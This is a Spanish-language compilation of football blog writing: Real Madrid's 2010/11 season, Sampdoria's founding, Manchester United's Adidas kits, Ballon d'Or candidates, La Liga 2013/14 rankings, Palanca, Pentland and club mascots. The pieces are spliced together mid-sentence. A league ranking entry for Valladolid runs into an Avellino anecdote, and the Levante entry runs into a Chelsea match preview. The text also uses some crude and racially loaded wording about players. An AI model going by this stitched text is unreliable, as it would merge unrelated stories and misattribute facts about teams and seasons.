grandes sumando puntos de tres en tres, y mirándose de reojo. El Madrid superó el leñazo del Barcelona con un doblete de Cristiano frente al Valencia (2-0) y el equipo mantuvo el nivel de resultados frente a un rival que se encaminaba a pulverizar el récord histórico de victorias consecutivas en Liga. El punto de inflexión llegó en Almería, cuando un 1-1 fue leído por muchos como la despedida del Madrid de la Liga. Malo para los blancos, malo para la competición. Otros dos resultados negativos fuera (1-0 en el antiguo Sadar y 0-0 en Coruña) alejaban a los blancos de la estela del Barcelona, convertían el torneo de la regularidad en un imposible, y dejaban constancia de la dificultad del Real frente a defensas muy cerradas; esos cerrojos que se revientan con unos contra uno en estático como el que tiene Messi y el que no tiene Cristiano Ronaldo, que pasaba esos días por un bajón de forma.Precisamente en los remotos orígenes del club se encuentra la respuesta a esa curiosidad. La Sampdoria nació como resultado de la fusión de dos clubes clásicos del fútbol genovés de finales del siglo XIX, la Ginnastica Sampierdarenese y la Società Andrea Doria, rivales históricos que al final fueron condenados a entenderse.La Ginnastica Sampierdarenese fue fundada en el año 1891 (aunque la sección de calcio no llegó hasta 1911) en el barrio de Sampierdarena, una de las zonas más fuertemente industrializadas de la región -no en vano es conocida como ‘la Manchester italiana’-, por trabajadores de las industrias de la zona, ansiosos por poder competir contra los equipos fundados en la ciudad por los ingleses que habían llegado a trabajar al activo puerto genovés. Fue pues, desde sus inicios, un club que tenía su raigambre social en una clase trabajadora y eminentemente humilde, que veía en la práctica del fútbol un entretenimiento y una forma de canalizar su orgullo local frente a la inmigración inglesa.Por su parte, la Società Andrea Doria era creada en el año 1895 en un contexto social, eso sí, completamente distinto al de sus vecinos. Originalmente se trataba de un club gimnástico, actividad deportiva de carácter más elitista que hacía furor entre las clases más pudientes a finales del siglo XIX, pero ante el creciente interés por el fútbol tras la llegada de los trabajadores británicos, pronto adoptó una sección de calcio, que fue englobada inicialmente dentro de la propia Federación italiana de Gimnasia.Ambos clubes trataban de competir con el otro gran club de Génova, el por entonces poderoso Genoa, fundado en 1893 por comerciantes ingleses establecidos en la ciudad italiana, y que dominaba con mano de hierro en aquellos primeros pasos del fútbol en Italia (no en vano fue el primer club en alzarse con un Scudetto en el año 1898). Pronto se daría paso a la histórica rivalidad que aún persiste hoy en día, haciendo del Sampdoria-Genoa uno de los derbys más apasionantes del planeta fútbol. La hegemonía del Genoa precipitó una serie de diversas fusiones de clubes de la ciudad que trataban de aunar fuerzas para menoscabar la hegemonía del poderoso club del grifone. Todo por acabar con el aplastante dominio del club menos italiano de todos los creados en Génova. Así nacieron varios clubes como resultado de las uniones de distintos equipos de la ciudad. La Sampierdarenese se fusionó con distintos clubes, en aras de alcanzar un mayor potencial que le permitiera competir en igualdad de condiciones con el rival Genoa. Pero ninguna de esas fusiones fructificaron. Ninguna hasta que, en el mes de agosto de 1946, la Ginnastica Sampierdarenese y la Andrea Doria, que por entonces deambulaba en la Serie C, se fusionaron de manera definitiva, dando lugar a la Unione Calcio Sampdoria que conocemos todos.El nuevo equipo no sólo heredaba el nombre de sus fundadores (Samp-Doria), sino que hacía suyos además los colores de ambos equipos fundiéndolos en una emblemática combinación: de un lado, el rojo y el negro de la Sampierdarenese, y de otro, el blanco y el azul de la Andrea Doria, que daban lugar a la curiosa y original camiseta de la actual Sampdoria, enraizada cromáticamente en el sustrato de sus dos clubes germinales.Tras la fusión, la Sampdoria se convirtió en uno de los equipos clásicos de la Serie A italiana. Campeón del Scudetto en la temporada 1990/91 (con aquel equipo con Pagliuca, Mancini, Lombardo o Mikhailichenko) y subcampeón de la Copa de Europa en la recordada final de Wembley contra el Barça, su último título data de la temporada 1993/94, en la que se alzó con la Coppa d’Italia. Puedes comprar camisetas de la Sampdoria en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Ahora demás, la camiseta de la temporada 2015/16 a precio de saldo. El reciente y sonado retorno de las tres bandas de Adidas a los hombros de los futbolistas del Manchester United se ha interpretado como una vuelta al clasicismo. Tras trece años con Nike, y otros diez anteriormente con Umbro, el United ligó el futuro de su vestimenta al gigante alemán a razón de un contratazo de setecientos cincuenta millones de libras por diez años, cifra que la compañía norteamericana declaró no estar en condiciones de alcanzar y que supone solo cuarenta millones de libras menos de lo que los Glazer pagaron en su día por hacerse con la entidad en el año 2005. Muchas cosas han cambiado desde la anterior era Adidas en Old Trafford. Tantas, que interpretar que la vuelta de la firma alemana significaría un retorno al estilo sobrio y sencillo de la década de los años ochenta era aventurarse demasiado. En poco o en nada se diferencian las tres bandas del swoosh. Las tendencias actuales parecen bien definidas y no hay factores que indiquen que la corriente que mueve a los actuales diseñadores de equipaciones deportivas vaya a cambiar. La creencia de que volver a la marca de las tres bandas era volver a los ochenta y a aquellos añorados diseños era una utopía, un sueño empapado en la humedad de la nostalgia y ceñido a la idea de que cualquier tiempo pasado fue (estilísticamente) mejor.A juicio de la mayor parte de los aficionados, Adidas no ha empeorado el trabajo realizado hasta ahora por Nike… pero tampoco lo ha mejorado de manera considerable. No son tiempos para apuestas arriesgadas. Tampoco la consagración del tejido sagrado a los dólares de General Motors ayuda, con ese invasivo y antiestético logotipo de Chevrolet estampado en la pechera que convierte a su orgulloso portador en algo parecido a un nada discreto hombre-anuncio. Pero el resultado final es aceptable, asumiendo el estropicio del patrocinador principal pero huyendo de diseños imposibles y colores ajenos a la identidad del club que no habrían hecho otra cosa que levantar en armas a una afición ya bastante quemada con las intromisiones extranjeras en su histórica sociedad. Y no es poco.Queda como anécdota, o quizá no, el partido de Santander, en el que coincideron la ausencia de la estrella portuguesa y el mejor fútbol asociativo del conjunto capitalino.Así como en Liga estos errores puntuales acabarían condenando al Madrid, en los torneos coperos el equipo iba batiendo rondas una tras otra. A principios de febrero se habían clasificado ya para la final de Copa, en la que habían abusado del Levante (8-0) y batido con solvencia a Atlético de Madrid y Sevilla. Paralelamente, se había enterrado ya la famosa maldición de Champions, con una victoria clara frente al Lyon en octavos (3-0) y una interesante paliza al Tottenham (4-0), en la que Adebayor, con dos goles, dejó una pequeña impronta en su fallido y seguramente breve periplo por Chamartín. En ambas competiciones, sin embargo, se vivían todas estas victorias más con expectación que con alegría, pues todo el mundo sabía que encaminaban al Real a la madre de todas las batallas contra el Barcelona, un cuádruple enfrentamiento para dirimir la soberanía del fútbol europeo. A priori, lo mejor que puede verse en un estadio en esta época, y repetidas veces.Sin embargo, lo sucedido ya es historia, y no hermosa. Toda Europa contempló unos partidos muy duros, jugados en un clima infernal, llenos de juego subterráneo y fingimiento, y disputados en medio de un cruce de declaraciones que ensuciaron la imagen de ambos técnicos, y también de algunos jugadores. En lo futbolístico, Mourinho decidió plantear el primer partido con la línea defensiva muy retrasada, situar a Pepe como mediocentro para frenar a Messi, y esperar al segundo tiempo para tratar de aprovechar el mayor poderío físico del Madrid; la apuesta le salió bien a medias, pues si el 1-1 les dejaba aún más fuera de la Liga, quedó una sensación de equilibrio en el ambiente. La final de Copa, jugada en segundo lugar, vio a un Madrid mucho más presionante y descarado en la primera mitad, que pagó el esfuerzo en la segunda convirtiéndose en un muñeco en manos del Barça. Iker Casillas fue el responsable de llevar el partido a la prórroga, y allí decidió un contragolpe muy bien llevado por Marcelo, Di María y Cristiano. El tercer partido volvió a las premisas del primero, y transcurría dócilmente hacia un 0-0 hasta que Pepe fue expulsado por un presunto juego brusco grave sobre Alves; Messi entró por el hueco y cerró la eliminatoria con dos tantos –tremendo el segundo- dejando el cuarto partido a beneficio de inventario. El balance dejaba una victoria para cada equipo y dos empates, sensación de equilibrio en cuanto a la competitividad, y los premios gordos para el Barcelona.El epílogo de la temporada resultó, paradójicamente, benéfico para el Madrid, que a pesar de no jugarse nada encadenó una serie de goleadas escandalosas, sirvió en bandeja el Pichichi histórico a Cristiano Ronaldo, y dejó una imagen de seriedad y poderío que ha ayudado a que desde el club se encare el verano con serenidad. Ha sido despedido Valdano, tan brillante frente a los micrófonos como inexplicable su presencia en un equipo que entrena Mourinho. Y aunque suenan fichajes poco necesarios, el más estelar hasta ahora, Nuri Sahin, refuerza la zona más débil del equipo. Recapitulando, lo más positivo que se puede decir del Madrid actual es que, además de haber roto la sequía de títulos, posee a día de hoy una plantilla y un entrenador que han competido al más alto nivel, y que poseen tanto la confianza de la directiva como de la mayor parte de la afición; esta última, en particular, se antoja vital para construir algo en una temporada que va a arrancar con el Barcelona como campeón de Europa y de Liga. En lo negativo, el Madrid debe corregir la ausencia de un centrocampista defensivo de garantías que auxilie a Xabi Alonso. Y por encima de todo, intentar frenar la diarrea dialéctica de Mourinho, que por más que pueda tener razón en muchas ocasiones, crea enemigos donde no los hay, y genera aún mayor animadversión en un periodismo en general predispuesto contra él desde el principio. Una cosa es centrar la atención en sí mismo para quitar presión a los jugadores, y otra es la sobreexposición mediática que hemos vivido, que no le hace bien ni a él, ni al Madrid, ni a la competición en general. Alguien debería ponerle a Mou aquellas viejas sevillanas que dicen: “Hay palabras que duelen y no se deben decir”. Por muy ciertas que sean, si lo son.Lo mejor: el fichaje de Özil, el poderío goleador de Cristiano Ronaldo, la dirección de Xabi Alonso, el crecimiento de Marcelo, la seriedad defensiva del equipo, la segunda vuelta de Benzema, la profusión de goleadas, la confianza en un proyecto…Lo peor: algunos numeritos de Mourinho en la sala de prensa, los cortes de manga de Pepe en la final de Copa, el fichaje de Adebayor, la titularidad de Khedira , las desapariciones de la alineación de Benzema y Özil en la tormenta de clásicos, la brutal campaña de desprestigio del diario “El País”… Para terminar con esta sección  que nos ha acompañado durante todo el Mundial, os proponemos una historieta para contar a vuestros chavales en el futuro: la de un grupo de sensacionales futbolistas con una idea clara de juego y dirigidos por un hombre muy sabio, frente a una pandilla de navajeros como pocas veces se ha visto en un campo de fútbol; de un árbitro permisivo hasta lo indignante, de cómo una selección alcanzaba su pico histórico mientras otra arrastraba por el fango una camiseta gloriosa, de no confundir competitividad y violencia, y sobre todo, de un hombre genial, modelo como futbolista y como persona, con quien el juego fue justo. Justicia poética.Aquí concluyen nuestras historietas, que comenzamos hace ya más de un mes recordando la mayor goleada de la historia de la Copa del Mundo. Ha sido un placer compartir con ustedes estas mañanas mundialistas, y esperamos que hayan disfrutado tanto de esta sección como nosotros escribiéndola. Impresiona darse cuenta de que los últimos siete Balones de Oro se han repartido entre dos futbolistas. La tiranía de Cristiano y Messi es feroz, hasta el punto de que no resulta fácil pensar seriamente que alguien amenace a corto plazo su reinado como mejores jugadores del mundo. Sin embargo, ninguno de los dos es un niño ya, los dos están evolucionando hacia roles que deben exigirles menos físicamente -CR a goleador puro, Leo a media punta- y por ley de vida, llegará el momento del declive, que el arriba firmante sitúa en un ejercicio de fútbol ficción para dentro de dos o tres años. Asumido esto, una pregunta divertida sería tratar de ponerle cara y ojos al sucesor de las dos bestias pardas en el dorado trofeo, y así lanzamos ayer el guante en Twitter. Estos nombres surgieron:Hazard. En opinión del arriba firmante, el mayor candidato. Convertido en una de las mayores atracciones de la liga inglesa, tiene prácticamente todo lo que se le puede pedir a un enganche: una velocidad sideral en espacios cortos, uno contra uno imponente, visión para el pase y bastante gol. Además de sus virtudes futbolísticas, se encuentra en un entorno muy estable con futbolistas a su alrededor que pueden ayudarle a crecer y un gran entrenador para orientarle. Además, en 2-3 años estará en la edad ideal.Reus. No está viviendo su mejor temporada el explosivo atacante germano, lastrado por lesiones que no le están dejando exhibir su nivel real, pero las cualidades demostradas en los últimos años lo meten en esta lista sí o sí. Su explosividad es tal que a veces oculta su técnica y conocimiento del juego, y siendo demoledor con espacios, se trata de un futbolista que también se desenvuelve con soltura en ataque estático. Su candidatura dependerá de su próximo destino y su adaptación a él, pues parece que, descabezado por el Bayern, la gran época de Klopp ha concluido en el BvB.Isco. Ídolo en el Bernabéu casi desde el primer día, la conversión del malagueño de mediapunta en centrocampista clásico es quizá la noticia táctica más relevante del Real Madrid en esta temporada. Sin embargo, a pesar de que pelea en una posición que no es la suya con un entusiasmo encomiable, Alarcón sigue dando su mejor rendimiento en las cercanías del área, donde aúna como nadie la virguería y la eficacia. Juega en su contra la inexistencia de su posición en el 4-3-3 que emplea el Madrid, y seguramente sus posibilidades de un futuro Balón de Oro pasen por una eventual modificación de ese esquema. Su juventud juega a su favor.Neymar. Presuntamente el fichaje más caro de la historia del fútbol, la estrella brasileña lleva un año casi y medio a bastante buen nivel, sobre todo teniendo en cuenta las externalidades que cuentan en su contra: el precio pagado por el Barça, el mal estado general de la institución y la subordinación a Messi, que él parece haber aceptado con buen talante desde el primer día.Porque no todo lo que el pasado nos ofreció fue necesariamente mejor. El paso del tiempo nos hace perder cierta perspectiva. Enterramos lo olvidable y disparamos la cotización de lo memorable. La memoria es peligrosamente acrítica. Y también lo es con Adidas y algunos de sus antiguos trabajos para el Manchester United elevados ya a la categoría de icónicos.Puedes comprar camisetas del Manchester United, con un completísimo muestrario desde los años ochenta hasta la actualidad, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Vamos a ponernos (aún más) nostálgicos. Vamos a hablar de inviernos extremos ejerciendo toda su crudeza sobre céspedes impracticables, de ocho calles de tartán alejando a los protagonistas de la grada. De botas negras embetunadas, de pantalones ceñidos a medio muslo y embadurnados en barro y verdín. De cuando los colores de las camisetas no brillaban tanto y a los futbolistas había que distinguirlos por sus movimientos sobre el campo porque no los veíamos en Ultra HD en nuestras televisiones de cincuenta pulgadas. Vamos a volver a ese ambiente de la vieja Copa de Europa por el UHF de una pequeña televisión clandestina en blanco y negro. A cuando los grandes partidos eran excepción y se saboreaban como un bocado único. A cuando jugar en Alemania no era un compromiso ligero. Era ‘JUGAR EN ALEMANIA, UF’. Cinco décadas de competición del Real Madrid por el continente arrojaron un muy reprochable balance de únicamente una victoria (que no fue lograda hasta el año 2000 en Leverkusen) y tres empates sobre suelo alemán en un total de veintidós visitas. Lo habitual era sucumbir ante el rodillo alemán y doblar la rodilla ante la temida fiereza teutona. El madridismo, y el fútbol europeo en general, vivía su particular batalla del bosque de Teotoburgo cada vez que tocaba jugar eliminatoria en Alemania. Los queruscos se vestían de Bayern, de Mönchengladbach, de Hamburgo o de Karlsruhe, pero el resultado era invariable. Arrasados, pisoteados, goleados con crueldad por la obra y gracia de un modelo futbolístico que acabó convirtiéndose en leyenda.Pero los tiempos están cambiando. Alemania ya no es Alemania, futbolísticamente hablando. El guión ha dado un giro argumental radical y las estructuras germánicas ya no gozan de la firmeza de antaño. En las tres últimas temporadas, el Real Madrid ha aumentado notablemente su cotización en suelo germano. En sus seis últimas visitas, el saldo es de tres victorias contundentes (dos en Gelsenkirchen y una en Múnich) y tres derrotas (las tres, precisamente, en Dortmund), unos logros impensables hace apenas una década. Tal vez sea porque en Alemania la clase media futbolística, saqueada de forma sistemática no solo por el Bayern sino por el resto de los gigantes del continente, se ha visto debilitada seriamente en los últimos tiempos y el salto competitivo es demasiado notorio. O quizá la implantación masiva de futbolistas de otras nacionalidades, tan beneficiosa en otros aspectos, haya incidido de manera negativa en la forja y conservación de la marcada identidad y personalidad del fútbol alemán, la misma que en tantas otras ocasiones fue argumento más que suficiente para defender posiciones e infundir terror ante rivales de mayor peso específico. Alemania ya no es el infierno hecho fútbol. La Copa de Europa ya no es la Copa de Europa. Y tú y yo somos cada temporada un año más viejos. Con la disputa de la jornada del pasado fin de semana damos por concluida la primera vuelta del Campeonato Nacional de Liga 2013/14. Como suele ser costumbre, hemos vivido algunas sorpresas y varias decepciones, equipos que preveíamos estarían más arriba y otros que, por el contrario, han conseguido auparse a posiciones inesperadas cumplido este ecuador liguero. Vamos a analizar, de manera sucinta, lo que han dado de sí los veinte equipos en estas primeras diecinueve jornadas.20º- Real Betis. Gran decepción de lo que llevamos de curso. Arrancó la temporada con la ilusión de Europa, pero ha padecido demasiado la pérdida de varios elementos esenciales de la plantilla del pasado año (Beñat, Cañas, Adrián, la lesión de Rubén Castro…). La destitución de Pepe Mel se interpretó como un volantazo a la desesperada de una directiva sobrepasada por la situación. Lo malo es que parece que Garrido no ha hecho limpieza de vicios y la cosa sigue parecida. Tiene que hacer números europeos en la segunda vuelta para evitar el descenso.19º- Rayo Vallecano. Lastrado por la propuesta casi suicida de Paco Jémez, el equipo vallecano sufre para sobrevivir. Padece una endeblez defensiva que le hace candidato claro al descenso. Encima, parece haber perdido el gol que le acompañó en los dos últimos años con jugadores como Michu, Piti y Baptistao.18º- Real Valladolid. El curso post-Djukic está siendo complicado. Con una plantilla prácticamente idéntica a la del curso pasado, las cosas no terminan de salir como JIM desearía.Tenían también a dos negros eléctricos, Juary y Barbadillo. Qué coño, me cae muy bien el Avellino.Aparte de por vestirse de indio apache para un anuncio de los que se hacían cuando la canción del Cola Cao no molestaba a nadie, Barbadillo dejó su sello en la liga italiana. El Patrulla llegó a una ciudad destrozada por el terremoto que sacudió la Irpinia en el 80 y la reconstruyó ladrillo a ladrillo al menos en lo futbolístico. Regate aquí, regate allá y diez goles que fueron oro en las tres salvaciones consecutivas del club. Mágico en el Cadiz, ya saben. Luego se fue al Udinese y allí sigue entrenando a los juveniles que un día colocará Quique Pina en cualquier equipo del infra español. Bueno allí en Udine, y en los recueros, inventados y pajeros, de algún farsante como yo. “Teníamos prohibido gritar un gol de penal porque un gol de penal lo hace cualquiera” Al aparato César Luis Menotti contándonos detalles sobre la finísima filosofía de juego que funcionaba en Rosario Central cuando él comenzaba a dar las primeras patadas como profesional de la pelotita. Si hasta Pelé, que sin embargo no tuvo remilgos en fabricar su milésimo gol desde los once metros, pensaba que marcar de penal era de cobardes… No nos queda otra que asumirlo y el menos hacerlo bonito.Cruyff y Olsen inventando el circo eficaz en el Ajax de los 80, la paradinha eterna de Antonin Panenka congelando la escena para birlarles a los alemanes la Eurocopa 76. Lo que la mayoría resolvería a base de fuerza y cálculo unos pocos genios se lo ventilaron con sofisticación y estilo. Y entre los que pulieron la suerte del penalti también hay que incluir a un oviedista. En ese saco genial cabe Fred Pentland.Jugador cuando el fútbol comenzaba a vestirse de fútbol y pionero del asunto en España, Pentland fue el primer entrenador en la historia del Real Oviedo. Duró un año pero dejó su marca aconsejando un sistema para la ejecución del penalti tan original como desconcertante para los porteros rivales. Con Pentland los penaltis se lanzaban a ciegas. Entre la portería y el balón, completamente de espaldas al arco y sin ofrecer la más mínima señal al rival, el lanzador esperaba el toque de silbato.Al escuchar la señal se giraba repentinamente y chutaba. Puro showtime en el protofútbol.Y ahora sí, imagínense por un momento la escena. Es 1926 en Oviedo y orbaya con gracia sobre el barro del antiguo campo de Teatinos. Todo está nublado menos la mente de Fred Pentland mientras al fondo un par de chavales de de corto lanzan penaltis a ciegas. En la banda, un tipo larguísimo y bigotón que no abandona ni por un segundo su bombín sonríe satisfecho con la ocurrencia. Con la manía de bucear en el under futbolístico entre ceja y ceja y tras disfrutar de la historia del Catanzaro en el gran Cityground llegué a un cromo imperdible, Massimo Palanca. Killer de provincias, bigotudo y anómalo, la historia de Piedino merece ser contada. Aunque a mi me gusta más comenzar por el final. Resulta que un catorce de febrero del 88 la curva Ovest del Ceravolo, el sector históricamente más caliente en Casa Catanzaro, se contrajo en un suspiro y sufrió por el ídolo. Está ahí abajo, mirando al verde. Un tipo con 34 primaveras en el bigote intentando comprender como narices había podido fallar el penalti destinado a abrir las puertas de la Serie A tras seis años de penurias por el subsuelo.El jugador más importante en la historia del club la ha estrellado contra el palo. Massimo Palanca, leyenda que había vuelto para el rescate, ha errado. La fábula a tomar viento. Como sería el shock que el modesto equipo sureño jamás a vuelto a pisar la máxima categoría del fútbol transalpino. Pero volvamos a Palanca.Piedino d’oro llega al Catanzaro en el 74 y tras una temporada para el olvido firma una segunda campaña de nota aportando once goles que tiran decisivamente del equipo hasta depositarlo en la Serie A. Cinco temporadas después de su primer ascenso, el Catanzaro camina gracias a un delantero centro achaparrado (apenas 170 centímetros y un 37 en las botas) que le pega de miedo cuando la portería está lejana. Y el caso es que cuanto más se empeña el Catanzaro en vivir en el alambre, de la A a la B y vuelta, más chicharros firma Palanca. Mejor artillero de segunda en la 77-78, su comportamiento, clase dentro y humildad fuera, eleva al zurdo bigotón a la categoría de ídolo del Ceravolo. Hasta el punto que comienza a ser conocido como el rey de Catanzaro.A Palanca conviene recordarlo por su extremada habilidad a balón parado. Y lo que es aun más deliciosamente anómalo, por sus golazos directamente desde el córner. Trece tantos olímpicos como trece soles en toda su carrera hablan a las claras de la precisión que tenía el tipo en aquellas botas del 37. Y desde un ángulo llegó su confirmación como icono nacional. Fue un 4 de marzo del 79 en Roma, Estadio Olímpico. Palanca ya venía jugando como los ángeles en el retorno del equipo a primera pero el cinco de aquel primer tiempo supo dejar su marca para siempre el imaginario nacional tirando de la especialidad de la casa. Con la zurda y desde la misma esquina. Por si fuera poco decidió añadir dos goles más al olímpico para completar un triplete histórico y nacer como cromo destinado a no abandonar jamás la memoria futbolística del país.Cosas del destino justo cuando el Catanzaro se saca de la manga la mejor temporada de su historia, séptimos en la A guiados por el jovencísimo Edy Biby, Palanca agarra la maleta para irse cedido vía Nápoles. Craso error. Ni rastro de la zurda olímpica, en San Paolo fracasa estrepitosamente y tan solo ve puerta en una ocasión durante los catorce partidos que disputa con los partenopeos. De ahí al Como, de vuelta al Nápoles y más tarde al Foligno de la Serie C2 en un tobogán de ignonimia. De mal en peor, Piedino ve la luz cuando el Catanzaro, equipo en el corazón, decide encomendarse de nuevo a su zurda para escapar del pozo de la Serie C al que habían caído. Imagino que la estupefacción general que invadió a la parroquia giallorossa al conocer la vuelta del ídolo solo fue comparable a la alegría de ver a  Palanca embolsarse un nuevo pichichi que contribuye decisivamente un nuevo ascenso.Luego ya saben, aquel palo traicionero y más goles hasta el año 90 cuando la Ovest y el resto del Estadio Nicola Ceravolo le despiden entre ovaciones durante un muy adecuado a su modesta leyenda Catanzaro-Barletta de Serie C. Con 115 goles anotados en su equipo de siempre el fútbol italiano se despedía el Rey de Catanzaro. Y el Oviedo subió en Cádiz. Si nadie nos dio un mapa cuando bajamos a la cloaca, cómo íbamos a saber que la última puerta estaba a 900 kilómetros de casa. Sin orbayu, con 28 grados de sol radiante sobre la cabeza. Arriba la luz, abajo una afición y un equipo reventando la tapa del colector a cabezazos para asomar después de doce años en la mierda. Centró Susaeta, remató David Fernández y saltaron por los aires todos los remaches que la habían lacrado durante años. Uno por uno, cedieron las soldaduras de personajes tan chapuceros como Gabino de Lorenzo o Alberto González. El penúltimo fue un 0-1 injusto, pero lo aflojó Diego Cervero con un emburrión agónico. El último, la irreparable injusticia cometida contra 155 oviedistas a los que esta chirigota infame que es el fútbol español les robó el momento por el que llevaban peleando más de una década. Da igual. En mitad del Carranza, con los calzones chorreando barro, temblando de emoción y con los ojos inundados completamos un parto durísimo. Y gritamos. Y lloramos. Y volvimos a nacer.No fue sencillo porque con el Oviedo en la pomada nada lo es. No es fácil adelantarse y clavarla con toda una ciudad cargada a la espalda como David Fernández. No lo es enroscar balones con tres mil almas agarradas a la bota como Susaeta. Tampoco bregar y emocionarse cuando ya lo hiciste todo en el fútbol como Font y Generelo. Jugarse el tipo SIEMPRE como Nacho López, Erice o Linares no es común. Desde luego no es sencillo ser como Esteban.El rendimiento de algunos jugadores clave, especialmente el del alemán Patrick Ebert, ha caído en picado, y el equipo se ha resentido muy notablemente. Tampoco ha ayudado la lesión de larga duración de Óscar, el catalizador del juego ofensivo de los castellanos. Tienen muy poco gol, pese a la magnífica temporada de Javi Guerra (junto al meta Mariño, lo mejor de los pucelanos).17º- Elche CF. Dentro de lo esperado. Bastante hace con, de momento, mantenerse fuera de las posiciones de descenso y con cierto margen sobre los tres últimos. La apuesta de Escribá se adapta perfectamente a lo (poco) que tiene. No están para lujos y florituras y por eso tiran de bloque. Pueden acabar lamentando su falta de experiencia en la categoría.16º- UD Almería. Parece que han recuperado el pulso tras un primer tercio del campeonato algo delicado en el que el puesto de Francisco al frente del banquillo estuvo pendiendo de un hilo. Con todo, no tiene plantilla para muchos alardes. Destaca el oficio de Soriano, un veterano de guerra que puede venir muy bien para aportar serenidad y calma, y las buenas apariciones de dos destacados inesperados: Rodri y Suso. Curiosa segunda juventud del meta Esteban, un clásico de hace quince años. Casta de sufridores.15º- RC Celta. Los de Luis Enrique pasaban por ser uno de los conjuntos más ilusionantes del pelotón de cola. Con incorporaciones como Nolito, Charles, Rafinha o Aurtenetxe, la idea era que el Celta daría que hablar. Y la realidad es que los puntos de su casillero no reflejan lo que disponen sobre el verde. Siempre alegre, siempre con vocación ofensiva, pero con una delicada tendencia a la pérdida inocente de puntos. A destacar también la irrupción del jovencísimo Santi Mina. A poco que encadenen tres resultados positivos ganarán en autoconfianza.14º- Málaga CF. Un año complicado en Málaga. No parecía el siempre locuaz Schuster el mejor técnico para capitanear la dura vuelta a la normalidad tras el año europeo. Lidiar con la nueva situación económica del club no era plato de gusto para nadie, pero el alemán aceptó el reto. La verdad es que, con lo que dispone, no se le puede exigir mucho más que lo ofrecido hasta la fecha. Será un año anodino.13º- CA Osasuna. Otro de los milagros navarros. Mendilibar duró poco al frente de una plantilla muy limitada. Su sustituto, Javi Gracia, es continuador de la saga de proezas osasunistas, manteniendo al equipo lejos del descenso con la misma receta de siempre: trabajo, pelea, tesón y esfuerzo. Se hace complicadísimo ganarlos, aunque curiosamente este año no han mantenido la fiabilidad como locales de temporadas pasadas.12º- RCD Espanyol. Los once hijos de puta de Javier Aguirre son un equipo combativo. Y dadas las circunstancias y el nivel medio de la plantilla perica, eso ya es mucho decir. Siguen teniendo una notable falta de calidad en el centro del campo, agravada tras la salida en verano de Joan Verdú. Se esperaba bastante más de jugadores como el repescado Thievy o el portugués Pizzi. Demasiado irregular como para aspirar a cotas mayores, demasiado firme como para considerarlo de cara al descenso. Rey de la zona de nadie.11º- Getafe CF. El del cuadro azulón es un caso curioso. Da la sensación de que juegan para más, de que sus miras son elevadas y su plantilla capaz… pero siempre se desinfla en el momento más inesperado (véase esta última jornada frente al Rayo). Luis García tiene equipo para, si quisiera, dar guerra por entrar en Europa. Con todo, al ser su línea más floja la defensa, encajan demasiados goles. No se prevé que vaya a sufrir.10º- Levante UD.El equipo inglés empezó como un rayo y fue apagándose hasta acabar convertido en un paupérrimo chispazo. Al italiano se le ha ido el equipo de las manos, lejos en la Premier, apeado de la FA Cup por el Everton y de la Carling por el Newcastle, la Champions es una de las pocas oportunidades que le restan para salvar la temporada. Abramovich, ese millonario que manda sobre el equipo londinense como lo haría un adolescente con su equipo de Liga Master, refrescó un equipo alicaído pensando, precisamente, en estas rondas eliminatorias.Torres y David Luiz fueron los elegidos para insuflar vida al equipo blue, para conjuntar a un equipo desdibujado con muchos problemas atrás y con una delantera Drogba-dependiente. El brasileño ha empezado con mejor pie, pero tras jugar la previa con el Benfica no podrá estrenarse en la Liga de Campeones. Por otro lado, el español no está entonado aún, todavía no ha superado eso que llaman periodo de adaptación. Su precipitado debut contra su ex-equipo en liga sólo sirvió para crear más dudas sobre su estado físico. Pocos dudamos de que es un buen delantero, pero estos fichajes acelerados y millonarios siempre nos traen recuerdos turbios.Con el perdón de Guardiola, creo que el equipo danés tiene pocas posibilidades de derrotar al Chelsea a doble partido. Del resultado de hoy depende su desempeño futuro. Aún no ha sido derrotado en casa y un buen resultado en el Parken Stadion puede espolearlos en la vuelta ante un equipo inglés que ya no es el que fue no hace mucho. N´Doye contra Torres. Seguir soñando en Europa los daneses, dar un paso más en el eterno deseo continental para los ingleses. Escribía H.P. Lovecraft que la tierra esconde secretos inenarrables. Que antes de que los humanos –una mera anécdota en la existencia cósmica- pisáramos la tierra, entre las grutas del planeta, en los vastos océanos, vivían seres indescriptibles, ilógicos, monstruosos. Seres sin forma definida, desproporcionados, tentaculares, atroces. Quizá las mascotas de los equipos de fútbol españoles sean el único vestigio sobre la faz de la tierra de aquellos inclasificables seres del abismo de los tiempos.Groguet y la mascota del Patrick Thistle escocésDel terror ciclópeo de Clam (Barça) al amorfo diablo Locco (Sevilla), pasando por vegetales vivientes como Palmerín (Betis), el Groguet primigenio (Villarreal), ese sol demoniaco del Patrick Thistle (único invitado foráneo en el post, por méritos propios), la impostada felicidad de Roelio (Pontevedra), la demoníaca sensualidad de Sumi (Cartagena)… los ojos del aficionado han visto cosas que el cerebro no puede procesar. Las siguientes fotos pueden dañar vuestra cordura. Ni Lovecraft tendría adjetivos suficientes para describir a esta pandilla arquetípica.Clam, Palmerín y LoccoDe todas las mascotas de nuestra Liga sólo hay una que es parte real de la afición. Que es tan macarra como el más macarra de los aficionados. Una mascota que ha sido vitoreada en mitad del campo, que ha sido expulsada por dejarse llevar por la alegría de un gol, que se ha declarado a su novia en mitad de un partido. Un reptil de sangre caliente. Koki es un caimán que anima en la orilla del campo al Córdoba C.F.Roelio y Sumi, que por cierto hacen buena parejaEntre el horror de la gomaespuma que caracteriza a todas las mascotas de nuestro fútbol, Koki aporta algo de racionalidad. Al menos tiene formas suaves, aunque sus ojos parecen haber visto cosas terribles. O como dijo mi chica la primera vez que fuimos juntos al Arcángel: ´Penitencia son 90 minutos bajo esa piel de cocodrilo y no 42 años para subir a Primera’ Entre tanta mascota horrorosa, feliz de que la afición blanquiverde tenga a Koki. Una mascota que no da miedo a los niños, que no habita en las profundidades del océano en ciudades milenarias, que no es nombrada en libros prohibidos. El amigo Sergio Cortina me reto esta semana a que escribiera sobre la mascota de mi equipo, aquí está mi hagiografía a Koki, la única mascota que no es malvada.Koki tras marcar el gol decisivo, o eso parece Hay dos tipos de héroes. Está el héroe arrebatador, carismático, estrella desde pequeño, salvador, potente, con el equipo colgado a la espalda. El que tiene una palabra de consuelo para el compañero que falla, el que coloca a sus hombres sobre el campo como en un juego de tablero. El que levanta la copa. Al que el entrenador abraza primero. Y después está el héroe errático, inesperado, intrascendente, que simplemente pasa por el sitio adecuado en el momento perfecto. Del que todos hablan al día siguiente. El que calla las burlas con un gol histórico y se ensancha sobre el campo, y no puede disimular la risa nerviosa del que sabe que ha 